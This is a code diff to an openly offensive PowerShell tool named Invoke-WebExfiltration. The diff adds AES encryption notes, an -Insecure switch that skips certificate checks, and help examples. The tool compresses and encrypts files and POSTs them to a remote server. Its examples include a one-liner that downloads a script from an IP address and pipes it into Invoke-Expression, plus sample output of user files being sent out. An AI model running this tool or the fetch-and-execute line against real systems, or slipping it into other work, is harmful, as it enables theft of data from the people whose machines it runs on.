@@ -2,42 +2,43 @@
 Function Invoke-WebExfiltration {
      <#
         .SYNOPSIS
-        PowerShell function to exfiltrate data via HTTP(s) POST request (with file gzip compression)
+        PowerShell function to exfiltrate data via HTTP(s) POST request (with file gzip compression and AES-256 encryption)
         Author: Philipp Rieth
-
-        .DESCRIPTION
-        ...
-
-
-
-
-        .PARAMETER Name
-        Specifies the file name.
-
-        .PARAMETER Extension
-        Specifies the extension. "Txt" is the default.
-
-        .INPUTS
-        None. You cannot pipe objects to Add-Extension.
-
-        .OUTPUTS
-        System.String. Add-Extension returns a string with the extension or file name.
-
-        .EXAMPLE
-        PS> extension -name "File"
-        File.txt
-
-        .EXAMPLE
-        PS> extension -name "File" -extension "doc"
-        File.doc
-
-        .EXAMPLE
-        PS> extension "File" "doc"
-        File.doc
 
         .LINK
         GitHub: https://github.com/PhilippRieth/Invoke-WebExfiltration
 
+        .PARAMETER Target
+        Specifices the target URL. Needs to be http(s)://<host>:<port>/sendfile
+
+        .PARAMETER Password
+        The passworld used for data encryption
+
+        .PARAMETER Proxy
+        Proxy to use. Format: http://<proxy-IP>:<port>
+
+        .PARAMETER Insecure
+        If defined, certificate errors like mismatch or self signed will be ignored
+
+        .EXAMPLE
+        PS> IWR 'https://192.168.20.102:8000/iwe' -SkipCertificateCheck | IEX
+
+        .EXAMPLE
+        PS > IWE  .\file.bin
+        [~] Target server: 'https://192.168.20.102:8000/sendfile'
+        [*] Password: ********
+        [+] Exfiltrating file '.\file.bin'
+        [~] All done!
+
+        .EXAMPLE
+        PS> ls file* | IWE -Insecure
+        [~] Target server: 'https://192.168.20.102:8000/sendfile'
+        [*] Password: ********
+        [+] Exfiltrating file 'C:\Users\tom\file.bin'
+        [+] Exfiltrating file 'C:\Users\tom\file.bin.b64'
+        [+] Exfiltrating file 'C:\Users\tom\file.bin.b64.gzip'
+        [+] Exfiltrating file 'C:\Users\tom\file.bin.zip'
+        [~] All done!
     #>
 
     [cmdletbinding()]
@@ -46,17 +47,16 @@ Function Invoke-WebExfiltration {
         [Parameter(
                 Position = 0,
                 Mandatory = $true,
-                # ValueFromPipelineByPropertyName=$true,
                 ValueFromPipeline = $true
         )]$File,
         [Parameter(
                 Position = 1,
                 Mandatory = $false
-        #ValueFromPipelineByPropertyName=$true
         )]
-        [string[]]$Target = 'TARGET_PLACEHOLDER',
+        [string]$Target = 'TARGET_PLACEHOLDER',
         [string]$Password,
-        [string]$Proxy
+        [string]$Proxy,
+        [switch]$Insecure
     )
 
     Begin {
@@ -86,7 +86,6 @@ Function Invoke-WebExfiltration {
         }
 
         Write-Debug "Plaintext password: '$Password'"
-        # Write-Host "[~]"
     }
 
     Process {
@@ -153,11 +152,6 @@ Function Invoke-WebExfiltration {
         Write-Debug "Base64 bin: $b64_bin_gzip"
         $ms.Close()
 
-        # Write encrypted base64 file to disk
-        # $b64_bin_gzip | Out-File "$file.aes256.gzip.b64"
-
-        # ToDo: Add secrent as an HTTP header, like an API key so unrestricted people can't upload?
-
         $body = @{
             "fn" = "$b64_filename"
             "ct" = "$b64_bin_gzip"
@@ -167,17 +161,21 @@ Function Invoke-WebExfiltration {
         $uri = [uri]::EscapeUriString($target)
         # $rest_timeout = 10
 
-        # ToDo: implement prameter '-insecure' if certificate is not trusted (e.g. self signed)
-
         try {
             if ($Proxy){
                 # $uriProxy = [uri]::EscapeUriString($Proxy)
                 # [System.Net.ServicePointManager]::ServerCertificateValidationCallback = {$true}
                 # Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -Proxy $uriProxy
+                # if ($Insecure){} else {}
                 Write-Host "[X] Error: Proxy not supported yet. I'm not sending anything!"
 
             } else {
-                $response = Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json"  # -TimeoutSec $rest_timeout
+                if ($Insecure){
+                    Write-Verbose "Ignoring certificate check"
+                    $response = Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json" -SkipCertificateCheck
+                } else {
+                    $response = Invoke-WebRequest -Uri $uri -Method POST -Body ($body|ConvertTo-Json) -ContentType "application/json"
+                }
             }
         }catch [System.Net.WebException] {
             if($_.Exception.Status -eq 'Timeout'){
@@ -194,7 +192,11 @@ Function Invoke-WebExfiltration {
             if ($message -like "No connection could be made*"){
                 Write-Host "[X] Error: Could not connect to the server. Got this error: '$($_.Exception.Message)'"
             }
-             else {
+            elseif (-not $response_code){
+                Write-Host "[X] Error: Server answered but I got no HTTP(S) return code"
+                Write-Host "[X] Error: This could be due to certificate error like mismatch or self signed"
+                Write-Host "[X] Error: Try again with parameter '-Insecure'"
+            }else {
                 Write-Host "[X] Error: Got unexpected response code '$response_code' from server"
                 Write-Host "[X] Error: Message from server: '$message'"
             }
@@ -209,7 +211,7 @@ Function Invoke-WebExfiltration {
         #}
 
          # Some return code handling
-         if ($response.StatusCode -ne '200'){
+         if ($response.StatusCode -ne '200') {
                 Write-Host "[X] Error: Got unexpected response code '$($response.StatusCode)' from server"
                 Write-Host "[X] Error: Message from server: '$($response.Content)'"
         }
